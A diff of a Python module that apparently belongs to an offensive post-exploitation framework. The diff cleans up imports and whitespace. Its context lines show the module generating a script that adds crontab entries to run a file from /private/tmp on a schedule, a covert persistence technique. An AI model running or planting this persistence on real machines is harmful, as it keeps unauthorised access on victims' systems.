@@ -1,6 +1,3 @@
-from lib.common import helpers
-import subprocess
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -27,7 +24,7 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             # list of any references/other comments
             'Comments': ['']
         }
@@ -79,13 +76,12 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
         Remove = self.options['Remove']['Value']
         Hourly = self.options['Hourly']['Value']
         Hour = self.options['Hour']['Value']
         FileName = self.options['FileName']['Value']
-        
+
         script = """
 import subprocess
 import sys
@@ -107,7 +103,7 @@ else:
         print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
         print subprocess.Popen('chmod +x /private/tmp/%s', shell=True, stdout=subprocess.PIPE).stdout.read()
         print "Finished"
-        
+
     elif Hour:
             cmd = 'crontab -l | { cat; echo "%s * * * * /private/tmp/%s"; } | crontab -'
             print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
@@ -118,4 +114,3 @@ else:
 
 """ % (Remove, Hourly, Hour, FileName, FileName, FileName, Hour, FileName, FileName)
         return script
-
